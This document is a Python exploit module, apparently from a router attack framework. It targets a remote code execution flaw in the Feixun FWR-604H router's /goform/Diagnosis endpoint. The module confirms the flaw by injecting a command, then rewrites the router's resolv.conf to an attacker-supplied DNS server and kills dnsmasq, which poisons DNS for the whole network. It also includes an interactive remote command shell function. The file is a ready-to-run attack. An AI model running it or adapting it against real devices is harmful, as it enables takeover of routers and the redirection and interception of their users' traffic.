#coding: utf-8
'''
@Test list:
feixun FWR-604H
'''
from routelib import *
from exp_template import *
import requests

class feixun_fwr604h_rce(Exploit):
    def __init__(self, url, taskid=0, targetid=0, cmd_connect='', data_redirect='', dns_server='', proxies={}):
        self.url = url
        self.taskid = taskid
        self.targetid = targetid
        self.cmd_connect = cmd_connect
        self.data_redirect = data_redirect
        self.dns_server = dns_server
        self.proxies = proxies
        self.log_data = []
        self.shell_data = []

    def meta_info(self):
        return {
            'name': 'feixun_fwr604h_rce',
            'author': 'z',
            'date': '2018-05-10',
            'attack_type': 'RCE',
            'app_type': 'Router',              #路由器为Router
            'app_name': 'Feixun',
            'min_version': '',
            'max_version': '',
            'version_list': ['FWR-604H'],             #min_version,max_version 和 verion_list 二者必选其一
            'description': 'Module exploits Feixun FWR-604H Remote Code Execution vulnerability which allows executing command on operating system level with root privileges.',
            'reference':[
                'me',
            ],   #参考文档
        }

    def exploit(self):
        if self.check():
            self.report("Target is vulnerable")
            self.report("DNS Poisoning...")
            #self.command_stager()
            self.dns_poison(self.dns_server)

        else:
            self.report("Target is not vulnerable",Level.warming)
        self.report('Exploit is complete')


    def dns_poison(self,new_dns_server='192.168.220.5', dns_conf_path='/tmp/resolv.conf', restart_cmd='dnsmasq'):
        dns = 'nameserver {}\\n'.format(new_dns_server)
        dns += 'nameserver {}'.format(new_dns_server)
        dns_cmd = "echo -e '{}' > {}".format(dns,dns_conf_path)

        self.report('DNS Redirect: %s' % new_dns_server)
        self.execute(dns_cmd)

        self.report('Remote dnsmasq will restart in 5 seconds.')
        self.execute("killall dnsmasq")
        return

    def command_stager(self):
        while True:
            cmd = raw_input("# ")
            if cmd in ['exit', 'quit']:
                return
            self.report(self.execute(cmd))

    def execute(self, cmd):
        req = session()
        if self.url.endswith('/'):
            self.url = self.url[:-1]
        uri = "{}/goform/Diagnosis".format(self.url)
        data = "doType=2&system_command=%s&diagnosisResult="%cmd.replace(' ','+')

        try:
            response = req.post(url=uri,data=data)
        except requests.Timeout as err:
            pass
            self.report(err.message,Level.warming)
            return ">timeout<"
        except requests.ConnectionError as err:
            pass
            self.report(err.message,Level.warming)
            return ""
        if response is None:
            return ""
        #response.encoding  = response.apparent_encoding
        rdata = response.content
        #print type(rdata)

        pattern = re.compile('name=\"diagnosisResult\">([\s\S]+?)</textarea>')
        ret = pattern.search(rdata)
        if ret is not None:
            #print ret.groups()
            return ret.group(1)
        else:
            return 'no match 2'

    def check(self):
        mark = random_text(4)
        cmd = 'echo {}'.format(mark)
        response = self.execute(cmd)

        if response == '':
            return False

        if mark in response:
            return True  # target is vulnerable

        return False  # target is not vulnerable


if __name__ == "__main__":
    import sys
    if len(sys.argv) < 3:
        print 'Usage(e.g.): feixun_fwr604h_rce.py http://192.168.0.1:8080 119.6.6.6'
        exit(0)
    e = feixun_fwr604h_rce(sys.argv[1],dns_server=sys.argv[2])
    e.exploit()


